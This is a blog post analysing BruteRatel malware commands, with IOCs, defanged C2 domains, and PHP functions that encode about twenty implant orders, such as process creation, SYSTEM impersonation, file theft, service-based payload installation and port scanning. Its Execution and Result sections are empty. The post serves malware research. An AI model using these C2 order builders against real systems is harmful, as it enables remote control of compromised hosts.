---
title: "BruteRatel full command analysis (3/X)"
date: 2025-03-20 
---

<link rel="stylesheet" href="/css/main.css">

## BazaarLoader / BRUTERATEL  

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the third part of my full analysis of BruteRatel commands : [Previous Part](https://cedricg-mirror.github.io/2025/03/19/BruteRatel2.html)  

This detailed analysis will be split into several parts, I will be presenting in this post the next 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the next 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
| "\xb0\xe9"   | [CreateProcessA](#CreateProcessA) | $process_path              |
| "\xc0\xeb"   | [TerminateProcess](#TerminateProcess) | $pid            |
| "\xd0\xbe"   | [ShellExecuteExA](#ShellExecuteExA) | $verb, $file, $parameters            |
| "\xe0\x9d"   | [ListActiveProcess](#ListActiveProcess) | NA                |
| "\xae\x6b"   | [ImpersonateSystem](#ImpersonateSystem) | NA |
| "\x39\x6f"   | [ImpersonateSystem2](#ImpersonateSystem2) | NA  |
| "\xd9\xf3"   | [unknown](#unknown) | $p1, $p2 |
| "\xd4\x3f"   | [unknown2](#unknown2) | $p1, $p2          |
| "\x74\x2c"   | [ReadFileW](#ReadFileW) | $filename, $size_in_KB              |
| "\x36\x6c"   | [RegEnumKeyA](#RegEnumKeyA) | $hKey, $SubKey       |
| "\x58\xb4"   | [QueryServiceConfig](#QueryServiceConfig) | $dir_path             |
| "\xea\xe2"   | [maybe_push_cmd](#maybe_push_cmd) | $p1         |
| "\xa1\x13"   | [WriteFile](#WriteFile) | $src, $dst    |
| "\x9a\x69"   | [listen](#listen) | $label, $port        |
| "\x4d\x3c"   | [pipe_com_todo](#pipe_com_todo) | $PipeName   $p2     |
| "\x37\xfe"   | [install_as_service](#install_as_service) | $MachineName, $serviceName, $payload |
| "\xe9\x97"   | [createService](#createService) | $MachineName, $serviceName, $path     | 
| "\x73\xfa"   | [deleteService](#deleteService) | $MachineName, $serviceName | 
| "\x3e\x3b"   | [changeServiceConfig](#changeServiceConfig) | $MachineName, $serviceName, $BinaryPathName | 
| "\x62\xc6"   | [GetProcessInfo](#GetProcessInfo) | $processName |
| "\x91\xe5"   | [port_scan](#port_scan) | $hostname, $ports |

# Dynamic Analysis  

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="CreateProcessA"></a>
# CreateProcessA  

```php
function CreateProcessA($process_path)
{
	$cmd_id = "\xb0\xe9 $process_path";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="TerminateProcess"></a>
# TerminateProcess  

```php
function TerminateProcess($pid)
{
	$cmd_id = "\xc0\xeb $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```
<a id="ShellExecuteExA"></a>
# ShellExecuteExA  

```php
function ShellExecuteExA($verb, $file, $parameters)
{
	$cmd_id = "\xd0\xbe $verb $file $parameters";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="ListActiveProcess"></a>
# ListActiveProcess  

```php
function ListActiveProcess()
{
	$cmd_id = "\xe0\x9d";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="ImpersonateSystem"></a>
# ImpersonateSystem  

```php
function ImpersonateSystem()
{
	$cmd_id = "\xae\x6b";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="ImpersonateSystem2"></a>
# ImpersonateSystem2  

```php
function ImpersonateSystem2()
{
	$cmd_id = "\x39\x6f";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="unknown"></a>
# unknown  

```php
// CreateProcess based on fields C1E0 and C26C from GlobalStruct
function unknown($p1, $p2)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xd9\xf3 $p1_b64 $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="unknown2"></a>
# unknown2  

```php
// CreateProcess based on fields C1E0 and C26C from GlobalStruct
function unknown2($p1, $p2)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xd4\x3f $p1_b64 $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="ReadFileW"></a>
# ReadFileW  

```php
// $size_in_KB is optional
// if 0 or not specified 512kb will be read from targeted file
function ReadFileW($filename, $size_in_KB)
{
	$filename_le16 = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$p1_b64 = base64_encode($filename_le16);
	
	$cmd_id = "\x74\x2c $p1_b64 $size_in_KB";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="RegEnumKeyA"></a>
# RegEnumKeyA  

```php
/*
	$hKey : 
	"1" = HKEY_LOCAL_MACHINE
	"2" = HKEY_CURRENT_USER
	"3" = HKEY_CLASSES_ROOT
	"4" = HKEY_CURRENT_CONFIG
	else = HKEY_USERS
*/
function RegEnumKeyA($hKey, $SubKey)
{

	$cmd_id = "\x36\x6c $hKey $SubKey";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="QueryServiceConfig"></a>
# QueryServiceConfig  

```php
/*
	$MachineName : can be NULL (LocalComputer)
	$param 2 : "full" or nothing (OPTIONAL) ?
	$param 3 : service Name (OPTIONAL)
	Query All services or just the one specified
*/
function QueryServiceConfig($MachineName, $p2, $ServiceName)
{

	$cmd_id = "\x58\xb4 $MachineName $p2 $ServiceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="maybe_push_cmd"></a>
# maybe_push_cmd  

```php
function maybe_push_cmd($p1)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xea\xe2 $p1_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="WriteFile"></a>
# WriteFile  

```php
function WriteFile($filename, $data)
{
	$data_b64 = base64_encode($data);
	
	$cmd_id = "\xa1\x13 $filename $data_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="listen"></a>
# listen  

```php
function listen($label, $port)
{
	
	$cmd_id = "\x9a\x69 $label $port";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="pipe_com_todo"></a>
# pipe_com_todo  

```php
function pipe_com_todo($PipeName, $p2)
{
	
	$cmd_id = "\x4d\x3c $PipeName $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="install_as_service"></a>
# install_as_service  

```php
function install_as_service($MachineName, $serviceName, $payload)
{
	$payload_b64 = base64_encode($payload);
	$dropPath = "C:\\Windows\\$serviceName.exe";
	
	$cmd_id = "\x37\xfe $MachineName $dropPath $serviceName $payload_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="createService"></a>
# createService  

```php
function createService($MachineName, $serviceName, $path)
{
	$cmd_id = "\xe9\x97 $MachineName $serviceName $path";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="deleteService"></a>
# deleteService  

```php
function deleteService($MachineName, $serviceName)
{
	$cmd_id = "\x73\xfa $MachineName $serviceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="changeServiceConfig"></a>
# changeServiceConfig  

```php
function changeServiceConfig($MachineName, $serviceName, $BinaryPathName)
{
	$cmd_id = "\x3e\x3b $MachineName $serviceName $BinaryPathName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="GetProcessInfo"></a>
# GetProcessInfo  

```php
function GetProcessInfo($processName)
{
	$cmd_id = "\x62\xc6 $processName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="port_scan"></a>
# port_scan  

```php
// ex: port_scan("tiguanin.com", "8041 80 42");
function port_scan($hostname, $ports)
{
	$cmd_id = "\x91\xe5 $hostname $ports";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```
